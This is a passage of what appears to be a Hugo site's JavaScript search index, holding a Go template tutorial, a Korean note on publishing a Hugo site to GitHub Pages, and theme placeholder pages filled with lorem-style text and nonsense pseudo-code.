}}\u0026lt;h4\u0026gt;{{ . }}\u0026lt;/h4\u0026gt;{{ end }}\r Example 5: If -\u0026gt; Else If\n{{ if isset .Params \u0026quot;alt\u0026quot; }}\r{{ index .Params \u0026quot;alt\u0026quot; }}\r{{ else if isset .Params \u0026quot;caption\u0026quot; }}\r{{ index .Params \u0026quot;caption\u0026quot; }}\r{{ end }}\r Pipes One of the most powerful components of Go templates is the ability to stack actions one after another. This is done by using pipes. Borrowed from unix pipes, the concept is simple, each pipeline\u0026rsquo;s output becomes the input of the following pipe.\nBecause of the very simple syntax of Go templates, the pipe is essential to being able to chain together function calls. One limitation of the pipes is that they only can work with a single value and that value becomes the last parameter of the next pipeline.\nA few simple examples should help convey how to use the pipe.\nExample 1 :\n{{ if eq 1 1 }} Same {{ end }}\r is the same as\n{{ eq 1 1 | if }} Same {{ end }}\r It does look odd to place the if at the end, but it does provide a good illustration of how to use the pipes.\nExample 2 :\n{{ index .Params \u0026quot;disqus_url\u0026quot; | html }}\r Access the page parameter called \u0026ldquo;disqus_url\u0026rdquo; and escape the HTML.\nExample 3 :\n{{ if or (or (isset .Params \u0026quot;title\u0026quot;) (isset .Params \u0026quot;caption\u0026quot;)) (isset .Params \u0026quot;attr\u0026quot;)}}\rStuff Here\r{{ end }}\r Could be rewritten as\n{{ isset .Params \u0026quot;caption\u0026quot; | or isset .Params \u0026quot;title\u0026quot; | or isset .Params \u0026quot;attr\u0026quot; | if }}\rStuff Here\r{{ end }}\r Context (aka. the dot) The most easily overlooked concept to understand about Go templates is that {{ . }} always refers to the current context. In the top level of your template this will be the data set made available to it. Inside of a iteration it will have the value of the current item. When inside of a loop the context has changed. . will no longer refer to the data available to the entire page. If you need to access this from within the loop you will likely want to set it to a variable instead of depending on the context.\nExample:\n {{ $title := .Site.Title }}\r{{ range .Params.tags }}\r\u0026lt;li\u0026gt; \u0026lt;a href=\u0026quot;{{ $baseurl }}/tags/{{ . | urlize }}\u0026quot;\u0026gt;{{ . }}\u0026lt;/a\u0026gt; - {{ $title }} \u0026lt;/li\u0026gt;\r{{ end }}\r Notice how once we have entered the loop the value of {{ . }} has changed. We have defined a variable outside of the loop so we have access to it from within the loop.\nHugo Parameters Hugo provides the option of passing values to the template language through the site configuration (for sitewide values), or through the meta data of each specific piece of content. You can define any values of any type (supported by your front matter/config format) and use them however you want to inside of your templates.\nUsing Content (page) Parameters In each piece of content you can provide variables to be used by the templates. This happens in the front matter.\nAn example of this is used in this documentation site. Most of the pages benefit from having the table of contents provided. Sometimes the TOC just doesn\u0026rsquo;t make a lot of sense. We\u0026rsquo;ve defined a variable in our front matter of some pages to turn off the TOC from being displayed.\nHere is the example front matter:\n---\rtitle: \u0026quot;Permalinks\u0026quot;\rdate: \u0026quot;2013-11-18\u0026quot;\raliases:\r- \u0026quot;/doc/permalinks/\u0026quot;\rgroups: [\u0026quot;extras\u0026quot;]\rgroups_weight: 30\rnotoc: true\r---\rHere is the corresponding code inside of the template:\n {{ if not .Params.notoc }}\r\u0026lt;div id=\u0026quot;toc\u0026quot; class=\u0026quot;well col-md-4 col-sm-6\u0026quot;\u0026gt;\r{{ .TableOfContents }}\r\u0026lt;/div\u0026gt;\r{{ end }}\r Using Site (config) Parameters In your top-level configuration file (eg, config.yaml) you can define site parameters, which are values which will be available to you in chrome.\nFor instance, you might declare:\nparams: CopyrightHTML: \u0026#34;Copyright \u0026amp;#xA9; 2013 John Doe. All Rights Reserved.\u0026#34; TwitterUser: \u0026#34;spf13\u0026#34; SidebarRecentLimit: 5 Within a footer layout, you might then declare a \u0026lt;footer\u0026gt; which is only provided if the CopyrightHTML parameter is provided, and if it is given, you would declare it to be HTML-safe, so that the HTML entity is not escaped again. This would let you easily update just your top-level config file each January 1st, instead of hunting through your templates.\n{{if .Site.Params.CopyrightHTML}}\u0026lt;footer\u0026gt;\r\u0026lt;div class=\u0026quot;text-center\u0026quot;\u0026gt;{{.Site.Params.CopyrightHTML | safeHtml}}\u0026lt;/div\u0026gt;\r\u0026lt;/footer\u0026gt;{{end}}\rAn alternative way of writing the \u0026ldquo;if\u0026rdquo; and then referencing the same value is to use \u0026ldquo;with\u0026rdquo; instead. With rebinds the context . within its scope, and skips the block if the variable is absent:\n{{with .Site.Params.TwitterUser}}\u0026lt;span class=\u0026quot;twitter\u0026quot;\u0026gt;\r\u0026lt;a href=\u0026quot;https://twitter.com/{{.}}\u0026quot; rel=\u0026quot;author\u0026quot;\u0026gt;\r\u0026lt;img src=\u0026quot;/images/twitter.png\u0026quot; width=\u0026quot;48\u0026quot; height=\u0026quot;48\u0026quot; title=\u0026quot;Twitter: {{.}}\u0026quot;\ralt=\u0026quot;Twitter\u0026quot;\u0026gt;\u0026lt;/a\u0026gt;\r\u0026lt;/span\u0026gt;{{end}}\rFinally, if you want to pull \u0026ldquo;magic constants\u0026rdquo; out of your layouts, you can do so, such as in this example:\n\u0026lt;nav class=\u0026quot;recent\u0026quot;\u0026gt;\r\u0026lt;h1\u0026gt;Recent Posts\u0026lt;/h1\u0026gt;\r\u0026lt;ul\u0026gt;{{range first .Site.Params.SidebarRecentLimit .Site.Recent}}\r\u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;{{.RelPermalink}}\u0026quot;\u0026gt;{{.Title}}\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\r{{end}}\u0026lt;/ul\u0026gt;\r\u0026lt;/nav\u0026gt;\r"}),a.add({id:290,href:'/docs/development/git/hugo/',title:"Hugo",content:"Hugo  휴고 다운로드\n   So cutey\n  Hugo는 Go언어를 기반으로 Go 언어를 이용한 프로그램 사용 및 수정\n  Markdown으로 글을 작성\n  git을 활용한 글 관리 및 버전 관리\n     Hugo 적용    Hugo 환경변수 등록\n  휴고 사이트 시작\n  hugo new site testproject cd testproject hugo server -D   테마 적용    Hugo 테마 다운로드\n  testproject 안의 themes 폴더에 테마를 넣는다\n  config.toml 파일에 theme = \u0026ldquo;테마이름을 추가\u0026rdquo;\n  themes/[ 테마이름 ]/examplesite/로 이동 후 config 파일을 제외한 모든 파일을 복사하여 testproject 아래에 복사한다.\n  hugo server -D를 통해 동작을 확인한다.\n      Github Page 적용   git init git remote add origin [ base Storage url ] git submodule add -b master [ github.io Storage url ] public hugo -t [ theme name ] cd public git add . git commit -m \u0026#34;message\u0026#34; git push origin master cd .. git add . git commit -m \u0026#34;message\u0026#34; git push origin master   submodule 생성시 public 폴더가 없어야 함\n  username.git.io로 확인\n  "}),a.add({id:291,href:'/docs/hidden/',title:"Hidden",content:"This page is hidden in menu Quondam non pater est dignior ille Eurotas Latent te facies Lorem markdownum arma ignoscas vocavit quoque ille texit mandata mentis ultimus, frementes, qui in vel. Hippotades Peleus pennas conscia cuiquam Caeneus quas.\n Pater demittere evincitque reddunt Maxime adhuc pressit huc Danaas quid freta Soror ego Luctus linguam saxa ultroque prior Tatiumque inquit Saepe liquitur subita superata dederat Anius sudor  Cum honorum Latona O fallor in sustinui iussorum equidem. Nymphae operi oris alii fronde parens dumque, in auro ait mox ingenti proxima iamdudum maius?\nreality(burnDocking(apache_nanometer),\rpad.property_data_programming.sectorBrowserPpga(dataMask, 37,\rrecycleRup));\rintellectualVaporwareUser += -5 * 4;\rtraceroute_key_upnp /= lag_optical(android.smb(thyristorTftp));\rsurge_host_golden = mca_compact_device(dual_dpi_opengl, 33,\rcommerce_add_ppc);\rif (lun_ipv) {\rverticalExtranet(1, thumbnail_ttl, 3);\rbar_graphics_jpeg(chipset - sector_xmp_beta);\r}\r Fronde cetera dextrae sequens pennis voce muneris Acta cretus diem restet utque; move integer, oscula non inspirat, noctisque scelus! Nantemque in suas vobis quamvis, et labori!\nvar runtimeDiskCompiler = home - array_ad_software;\rif (internic \u0026gt; disk) {\remoticonLockCron += 37 + bps - 4;\rwan_ansi_honeypot.cardGigaflops = artificialStorageCgi;\rsimplex -= downloadAccess;\r}\rvar volumeHardeningAndroid = pixel + tftp + onProcessorUnmount;\rsector(memory(firewire + interlaced, wired)); "}),a.add({id:292,href:'/hidden/',title:"Hidden",content:"This page is hidden in menu Quondam non pater est dignior ille Eurotas Latent te facies Lorem markdownum arma ignoscas vocavit quoque ille texit mandata mentis ultimus, frementes, qui in vel. Hippotades Peleus pennas conscia cuiquam Caeneus quas.\n Pater demittere evincitque reddunt Maxime adhuc pressit huc Danaas quid freta Soror ego Luctus linguam saxa ultroque prior Tatiumque inquit Saepe liquitur subita superata dederat Anius sudor  Cum honorum Latona O fallor in sustinui iussorum equidem. Nymphae operi oris alii fronde parens dumque, in auro ait mox ingenti proxima iamdudum maius?\nreality(burnDocking(apache_nanometer),\rpad.property_data_programming.sectorBrowserPpga(dataMask, 37,\rrecycleRup));\rintellectualVaporwareUser += -5 * 4;\rtraceroute_key_upnp /= lag_optical(android.smb(thyristorTftp));\rsurge_host_golden = mca_compact_device(dual_dpi_opengl, 33,\rcommerce_add_ppc);\rif (lun_ipv) {\rverticalExtranet(1, thumbnail_ttl, 3);\rbar_graphics_jpeg(chipset - sector_xmp_beta);\r}\r Fronde cetera dextrae sequens pennis voce muneris Acta cretus diem restet utque; move integer, oscula non inspirat, noctisque scelus! Nantemque in suas vobis quamvis, et labori!\nvar runtimeDiskCompiler = home - array_ad_software;\rif (internic \u0026gt; disk) {\remoticonLockCron += 37 + bps - 4;\rwan_ansi_honeypot.cardGigaflops = artificialStorageCgi;\rsimplex -= downloadAccess;\r}\rvar volumeHardeningAndroid = pixel + tftp + onProcessorUnmount;\rsector(memory(firewire + interlaced, wired)); "}),a.add({id:293,href:'/posts/base/',title:"Base",content:"****          **** "})})()